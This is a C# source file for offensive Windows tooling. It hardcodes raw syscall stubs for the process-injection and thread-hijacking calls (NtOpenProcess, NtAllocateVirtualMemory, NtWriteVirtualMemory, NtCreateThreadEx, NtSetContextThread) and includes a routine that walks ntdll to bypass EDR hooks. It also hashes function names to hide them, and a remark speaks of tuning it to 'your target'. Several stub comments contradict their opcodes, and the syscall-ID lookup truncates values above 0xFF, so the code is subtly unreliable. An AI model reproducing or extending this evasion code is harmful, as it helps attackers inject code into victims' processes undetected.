using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Indirect_Syscalls.Native;

namespace Indirect_Syscalls
{
    /// <summary>
    /// The syscalls
    /// </summary>
    /// <remarks>The syscall codes are specifically for Windows 10 Pro (build 10.0.19042), make sure you use the right ones for your target!</remarks>
    public static partial class Syscalls
    {

        static IntPtr ntdllBaseAddress = IntPtr.Zero;

        public static IntPtr NtDllBaseAddress
        {
            get
            {
                if (ntdllBaseAddress == IntPtr.Zero)
                    ntdllBaseAddress = GetNtdllBaseAddress();
                return ntdllBaseAddress;
            }
        }

        static byte[] x64SyscallStub =
        {
            0x4C, 0x8B, 0xCA,               // mov r10, rcx
            0xB8, 0x26, 0x00, 0x00, 0x00,   // mov eax, 0x26 (NtOpenProcess Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };


        static byte[] bNtOpenProcess =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x26, 0x00, 0x00, 0x00,   // mov eax, 0x26 (NtOpenProcess Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtOpenThread =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x39, 0x01, 0x00, 0x00,   // mov eax, 0x139 (NtOpenThread Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtSuspendThread =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0xCF, 0x01, 0x00, 0x00,   // mov eax, 0x139 (NtOpenThread Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtResumeThread =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x52, 0x00, 0x00, 0x00,   // mov eax, 0x139 (NtOpenThread Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtAllocateVirtualMemory =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x18, 0x00, 0x00, 0x00,   // mov eax, 0x18 (NtAllocateVirtualMemory Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtWriteVirtualMemory =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x3a, 0x00, 0x00, 0x00,   // mov eax, 0x3a (NtWriteVirtualMemory Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtCreateThreadEx =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0xc1, 0x00, 0x00, 0x00,   // mov eax, 0xc1 (NtCreateThreadEx Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtProtectVirtualMemory =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x50, 0x00, 0x00, 0x00,   // mov eax, 0x50 (NtCreateThreadEx Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtGetContextThread =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0xFB, 0x00, 0x00, 0x00,   // mov eax, 0x50 (NtGetContextThread Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        static byte[] bNtSetContextThread =
        {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x9a, 0x01, 0x00, 0x00,   // mov eax, 0x50 (NtGetContextThread Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

       
        private static IntPtr GetNtdllBaseAddress()
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().Equals("NTDLL.DLL"))
                    return m.BaseAddress;
            }

            // we can't find the base address
            return IntPtr.Zero;
        }

        public static string HashSyscall(string functionName)
        {
            long key = 0xaab;
            
            var data = Encoding.UTF8.GetBytes(functionName.ToLower());
            var bytes = BitConverter.GetBytes(key);

            var hmac = new HMACMD5(bytes);
            var bHash = hmac.ComputeHash(data);

            return BitConverter.ToString(bHash).Replace("-", "");
        }

        public static byte GetSysCallId(string FunctionName)
        {
            // first get the proc address
            IntPtr funcAddress = GetProcAddress(NtDllBaseAddress, FunctionName);

            byte count = 0;

            // loop until we find an unhooked function
            while (true)
            {
                // is the function hooked - we are looking for the 0x4C, 0x8B, 0xD1, instructions - this is the start of a syscall
                bool hooked = false;

                var instructions = new byte[5];
                Marshal.Copy(funcAddress, instructions, 0, 5);
                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[3] { instructions[0], instructions[1], instructions[2] }, new byte[3] { 0x4C, 0x8B, 0xD1 }))
                    hooked = true;

                if (!hooked)
                    return (byte)(instructions[4] - count);

                funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
                count++;
            }
        }

        private struct SSN_ENTRY
        {
            public string funcNameHash;
            public IntPtr funcAddress;
        }

        
    }
}
